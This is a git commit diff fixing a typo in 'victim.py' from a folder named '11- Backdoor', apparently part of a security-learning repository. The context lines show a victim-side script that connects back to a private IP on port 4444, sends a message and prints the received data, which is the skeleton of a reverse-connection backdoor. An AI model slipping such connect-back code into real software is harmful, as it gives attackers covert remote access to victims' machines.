18eac5f90ee6cb830e1195006576a689100a5b41
Melih Sunman <76569614+sunman54@users.noreply.github.com>
2024-01-09 22:49:04 +0300

    typo fiexd

--- 11- Backdoor/victim.py
+++ 11- Backdoor/victim.py
@@ -6,6 +6,6 @@ connection.connect(('192.168.106.129',4444))
 connection.send('\n[+] Connected!!!\n')
 
 recieved_data = connection.recv(1024)
-pribt(recieved_data)
+print(recieved_data)
 
 connection.close()
